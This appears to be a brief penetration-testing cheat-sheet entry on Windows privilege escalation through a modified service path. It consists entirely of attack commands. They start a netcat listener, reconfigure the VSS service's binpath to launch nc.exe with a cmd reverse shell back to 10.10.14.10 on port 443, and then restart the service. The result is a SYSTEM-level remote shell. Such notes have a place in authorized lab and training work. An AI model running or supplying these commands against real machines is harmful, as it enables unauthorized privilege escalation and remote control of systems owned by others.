Privesc

Modify Service Path

# Start a nc listener
rlwrap nc -lvnp 443

# Assumed nc.exe is uploaded
sc.exe config VSS binpath="C:\Windows\Tasks\nc.exe -e cmd 10.10.14.10 443"

# Stop service
sc.exe stop VSS

# Start service
sc.exe start VSS
